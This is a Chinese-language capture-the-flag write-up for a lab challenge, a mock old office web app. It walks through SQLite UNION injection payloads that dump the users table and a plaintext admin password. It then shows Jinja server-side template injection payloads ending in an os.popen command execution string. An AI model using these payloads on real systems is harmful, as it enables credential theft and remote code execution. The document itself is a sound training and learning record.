# a-11 · 探索记录

对应题解：[`a-11.md`](./a-11.md)。

## 目标与起点

题面：「2008 年的老旧 OA，从普通员工权限切入，通过逻辑缺陷拿管理员，最终夺取控制权」。困难，500 分。预置账号 `2001 / Sys@Oa123`。

启动后是 Win2000 风格登录页，`Werkzeug/2.2.3` + `Python/3.9.25`。

## 第一阶段：登录与页面结构

```bash
curl -c cj -X POST --data-urlencode 'username=2001' --data-urlencode 'password=Sys@Oa123' http://$T/
# 302 → /dashboard
```

`/dashboard` 是「公共信息检索」，一个搜索框 `search_query`，标题写着「公告数据查询引擎 (SQL Native v1.0)」。

先正常搜 `test`：无匹配记录。再搜 `test'`：

```
数据库查询错误: near "'%'": syntax error
```

**一个单引号就拿到三件事：存在注入、数据库是 SQLite、查询形状是 `LIKE '%<q>%'`。**

## 第二阶段：UNION 定列数

payload 统一用 `%' UNION SELECT ...-- -`（开头的 `%` 用来自闭合 LIKE）。

| 列数 | 结果 |
| --- | --- |
| 2 | `UNION do not have the same number of result columns` |
| 3 | 同上 |
| **4** | 正常回显：ID / 主题 / 时间 / 摘要 |
| 5 | 同上错误 |
| 6 | 同上错误 |

4 列，并且第 4 列会渲染成「档案摘要：xxx」，是主要回显位。

## 第三阶段：读表

先读 schema：

```
%' UNION SELECT 1,name,sql,4 FROM sqlite_master-- -
→ notices / sqlite_sequence / users
```

`users` 表结构：

```sql
CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL, password TEXT NOT NULL, role TEXT NOT NULL)
```

读数据：

```
%' UNION SELECT id,username,password,role FROM users-- -
→ 1  admin  admin_C0mplex_P@ss!99  admin
→ 2  2001   Sys@Oa123             employee
```

管理员口令是**明文**，不需要破解。

## 第四阶段：管理员后台 → SSTI

用 `admin / admin_C0mplex_P@ss!99` 登录，导航多出 `/admin`。页面标题：

```
协同办公系统 2.0 - [系统管理控制台]
系统管理控制台 - 模板渲染内核 (Privileged Access)
```

表单字段 `notice_html_blob`，提交后直接渲染到「实时渲染视图」。

验证：

| payload | 结果 |
| --- | --- |
| `{{7*7}}` | `49` |
| `{{config}}` | 完整 Flask 配置，含 `SECRET_KEY` |
| `{{ cycler.__init__.__globals__.os.popen('cat /challenge/flag.txt').read() }}` | flag |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 无引号搜索 | 无匹配 | 正常功能 |
| 2/3/5/6 列 UNION | 报列数不符 | 3 列来回试一次即定位 4 |
| 管理员页面的其它猜路径（`/admin/users`、`/admin/config`） | 未深入 | `/admin` 本身就有 SSTI，够用 |
| 影子口令破解 | 不需要 | `users.password` 明文 |

## 这次真正的收获

1. **页面标题里的技术名词就是提示。** 「SQL Native」指向拼接注入，「模板渲染内核」指向 SSTI。
2. **一个单引号能确定后端和查询形状。** `near "'%'"` 同时给出 SQLite、LIKE 拼接和闭合方式。
3. **列数用循环试，不要猜。** 2→3→4 三次请求就定位。
4. **老系统口令常是明文。** UNION 读到直接登录，省掉整个破解阶段。
5. **提权后先看导航。** 管理员多出的链接往往就是最危险的功能；本例 `/admin` 直接是模板渲染。
6. **SSTI 的稳妥链是 `cycler.__init__.__globals__`。** 不依赖 `request`，`{{config}}` 先确认可读，再 `os.popen`。
